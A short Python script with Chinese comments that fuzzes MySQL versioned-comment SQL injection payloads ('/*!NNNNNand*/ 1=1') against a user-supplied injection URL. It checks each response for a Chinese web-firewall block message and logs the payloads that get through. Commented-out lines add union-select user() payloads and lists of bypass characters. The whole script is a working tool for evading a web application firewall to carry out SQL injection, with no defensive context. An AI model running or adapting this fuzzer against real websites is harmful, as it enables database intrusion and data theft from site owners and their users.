import requests

urlds=input("注入点url:")
url =urlds
# Fuzz_a = ['/*!', '*/', '/**/', '/', '?', '~', '!', '.', '%', '-', '*', '+', '=']
# Fuzz_b = ['']
# Fuzz_c = ['%0a', '%0b', '%0c', '%0d', '%0e', '%0f']
# FUZZ = Fuzz_a + Fuzz_b + Fuzz_c

header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}


    #PYLOAD = "/*!union" + a + b + c + d + e + "select*/"+a + b + c + d + e +"/*!user"+a + b + c + d + e +"()*/"+",2"
    #PYLOAD="/*!union"+a + b + c + d + e+"select*//*! user"+a + b + c + d + e+"()*/,2,3"
for i in range(10000,99999):
    PYLOAD="/*!"+str(i)+"and*/"+" 1=1"
    url_payload = url + PYLOAD
    response = requests.get(url_payload, headers=header)
    # print(response.text)
    if '网站防火墙' not in response.text:
        print("[*]URL:" + url_payload + "过狗！")
        f = open('g.txt', 'a')
        f.write(url_payload + "\n")
        f.close()
    else:
        print("[*]URL:" + url_payload + "被狗咬！")

